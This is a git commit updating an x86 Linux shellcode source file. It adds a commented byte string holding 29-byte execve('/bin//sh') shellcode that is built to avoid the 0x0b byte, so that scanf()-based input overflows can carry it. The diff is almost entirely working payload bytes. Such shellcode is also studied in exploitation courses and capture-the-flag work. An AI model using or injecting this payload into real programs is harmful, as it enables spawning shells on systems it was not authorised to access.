354da90ad66b6a31191c56584dc3f029df7cfa7c
Pinky <36157015+PinkP4nther@users.noreply.github.com>
2019-03-13 17:59:21 -0700

    Update linux_x86_execve_no_whitespace.asm

--- linux_x86_execve_no_whitespace.asm
+++ linux_x86_execve_no_whitespace.asm
@@ -10,6 +10,11 @@
 ; scanf() sees 0x0b as white space therefore ending the read from STDIN.
 ; 29 bytes.
 
+;sc = (
+;        "\x31\xc0\x50\x68\x2f\x2f\x73"
+;        "\x68\x68\x2f\x62\x69\x6e\x89"
+;        "\xe3\x31\xc9\x89\xca\xb8\xff"
+;        "\xff\xff\xff\x83\xe8\xf4\xcd\x80")
 
 section .text
 
